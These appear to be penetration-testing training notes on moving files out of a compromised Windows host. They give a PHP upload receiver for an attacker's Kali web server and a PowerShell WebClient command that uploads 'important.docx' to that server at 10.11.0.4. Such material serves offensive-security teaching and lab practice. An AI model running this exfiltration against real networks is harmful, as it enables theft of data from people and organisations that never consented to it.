# start here

In certain scenarios, we may need to exfiltrate data from a target network using a Windows client.
This can be complex since standard TFTP, FTP, and HTTP servers are rarely enabled on Windows
by default.

Fortunately, if outbound HTTP traffic is allowed, we can use the System.Net.WebClient PowerShell
class to upload data to our Kali machine through an HTTP POST request.

To do this, we can create the following PHP script and save it as upload.php in our Kali webroot
directory, /var/www/html:

<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>

create the uploads folder and modify its permissions, granting the www-data user
ownership and subsequent write permissions:

Note that this would allow anyone interacting with uploads.php to upload files to our Kali virtual
machine.

With Apache and the PHP script ready to receive our file, we move to the compromised Windows
host and invoke the UploadFile method from the System.Net.WebClient class to upload the
document we want to exfiltrate, in this case, a file named important.docx:

powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
